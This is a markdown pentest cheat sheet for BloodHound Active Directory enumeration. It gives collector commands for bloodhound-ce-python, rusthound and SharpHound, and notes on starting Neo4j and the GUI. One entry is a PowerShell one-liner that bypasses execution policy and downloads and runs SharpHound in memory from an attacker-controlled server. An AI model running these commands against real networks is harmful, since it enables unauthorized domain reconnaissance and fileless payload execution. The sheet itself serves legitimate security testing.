# Bloodhound

### bloodhound-python

Reminder stub - the legacy `bloodhound-python` collector targets old BloodHound (pre-CE). Use `bloodhound-ce-python` below for the current Community Edition server.

```sh title:"Legacy collector, use bloodhound-ce-python instead"
echo "Upgrade your bloodhound version..."
```
<!-- cheat -->

### bloodhound-ce-python

Python collector for BloodHound Community Edition. Runs all collection methods (sessions, ACLs, trusts, GPOs, cert services), zips the JSON, and uses the remote host as DNS so internal names resolve.

```sh title:"Full CE collection, zipped, target as DNS resolver"
bloodhound-ce-python -d $domain -u $user -p $pass -c all -ns $rhost_ip --zip
```
<!-- cheat
import domain_ip
var user
var pass
var rhost_ip
-->

### rusthound

Rust-based collector - dramatically faster than Python on large domains. The `-ce` build outputs BloodHound CE-compatible JSON.

```sh title:"Fast Rust collector for CE, use on large domains"
rusthound-ce -d $domain -u $user -p $pass -z
```
<!-- cheat
import domain_ip
var user
var pass
-->

### sharphound

Official C# collector - run from a domain-joined Windows host with cached credentials. Drops JSON + zip into the current directory.

```sh title:"C# collector, run from domain joined Windows host"
SharpHound.exe -c all
```
<!-- cheat -->

### sharphound (download & exec)

One-liner to pull SharpHound.ps1 from your attacker server and execute in-memory - no disk drop required.

```sh title:"In-memory download and exec SharpHound from attacker server"
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('$scheme://$lhost:$lport/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All -Domain $domain"
```
<!-- cheat
import tun_ip
import lports
import scheme
import domain_ip
-->

### neo4j start

Start the Neo4j database that backs BloodHound. Default credentials are `neo4j:neo4j` and you'll be prompted to change them on first login (web UI at http://localhost:7474).

```sh title:"Start Neo4j (default creds neo4j:neo4j, change on first login)"
neo4j start
```
<!-- cheat -->

### bloodhound GUI

Launch the legacy BloodHound (pre-CE) Electron GUI to load collected ZIPs.

```sh title:"Launch legacy BloodHound Electron GUI"
bloodhound
```
<!-- cheat -->

